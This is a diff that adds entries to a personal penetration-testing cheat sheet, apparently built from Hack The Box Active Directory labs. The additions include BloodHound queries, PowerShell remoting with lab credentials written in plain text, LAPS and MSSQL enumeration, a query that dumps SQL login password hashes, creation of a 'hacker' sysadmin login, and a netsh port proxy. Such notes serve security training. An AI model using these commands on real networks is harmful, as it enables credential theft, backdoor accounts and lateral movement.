@@ -106,6 +106,11 @@ PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Ob
 
 PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
 
+! Custom Bloodhound query for the same task
+
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p21
+
+
 --Testing for Local Admin Access
 
 PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
@@ -232,6 +237,14 @@ PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
 PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
 
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+
+!OR
+
+PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+
+
 ```
 ```
 -available modules loaded for use
@@ -304,6 +317,9 @@ PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollectio
 PS C:\htb> Find-LAPSDelegatedGroups
 
 PS C:\htb> Find-AdmPwdExtendedRights
+
+PS C:\htb> Get-LAPSComputers
+
 ```
 ### Group3r 
 ```
@@ -315,6 +331,16 @@ C:\htb> group3r.exe -f <filepath-name.log>
 ### Enumerating MSSQL Instances with PowerUpSQL
 
 ```
+- Bloodhound query for SQLADMINS
+
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+
+```
+
+
+```
+
+
 PS C:\htb> cd .\PowerUpSQL\
 
 PS C:\htb>  Import-Module .\PowerUpSQL.ps1
@@ -322,7 +348,12 @@ PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 PS C:\htb>  Get-SQLInstanceDomain
 
 ```
+```
+- authenticate to the  SQL server
 
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+```
 ### Kerberoast
 ```
 --Finding Users With SPN Set (PowerView)
@@ -1242,7 +1273,34 @@ use auxiliary/admin/mssql/mssql_escalate_dbowner
 use auxiliary/admin/mssql/mssql_escalate_execute_as
 ```
 
+```
+# Get version
+select @@version;
+# Get user
+select user_name();
+# Get databases
+SELECT name FROM master.dbo.sysdatabases;
+# Use database
+USE master
 
+#Get table names
+SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+#List Linked Servers
+EXEC sp_linkedservers
+SELECT * FROM sys.servers;
+#List users
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+#Create user with sysadmin privs
+CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
+EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
+```
+
+```
+List files of a folder in the machine
+
+SQL> EXEC master..xp_dirtree 'c:\inetpub\wwwroot', 1 , 1
+
+```
 ### MYSQL
 
 ```
@@ -1629,3 +1687,21 @@ $ ./username-anarchy -i /home/ltnbob/names.txt
 C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
 
 ```
+
+### Building directory tree for an assesment
+
+```
+$ mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}
+```
+
+
+### tmux logging
+
+```
+$ tmux new -s setup
+
+$ cd ~/.tmux/plugins/tmux-logging/scripts && ./togle_logging.sh
+
+! files stored in home directory
+```
+
